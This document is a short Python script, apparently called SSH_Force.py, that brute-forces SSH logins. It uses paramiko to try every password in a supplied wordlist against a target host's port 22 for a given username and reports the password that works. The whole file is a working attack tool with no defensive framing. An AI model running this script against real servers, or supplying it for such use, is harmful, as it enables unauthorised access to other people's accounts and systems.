import paramiko
import sys
import socket

if len(sys.argv) < 4:
    print("Usage: python SSH_Force.py [target] [username] [wordlist]")
    sys.exit()

# ----SSH_force.py [target] [wordlist]
Target_ip = sys.argv[1]
username = sys.argv[2]
wordlist_path = sys.argv[3]

# Establish the client
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(wordlist_path, 'r') as f:
    for line in f:
        password = line.strip()
        try:
            client.connect(Target_ip, port=22,
                           username=username, password=password, timeout=3)
            print(f"[+] password find : {password}.")
            break
        except paramiko.AuthenticationException:
            print(f"[-] Password {password} is not correct.")
        except socket.timeout:
            print(f"[x] Connection timeout, target may not accessable.")
        except socket.error as e:
            print(f"[x] Network error message: {e}")
        finally:
            client.close()  # Close the connect if success or fail
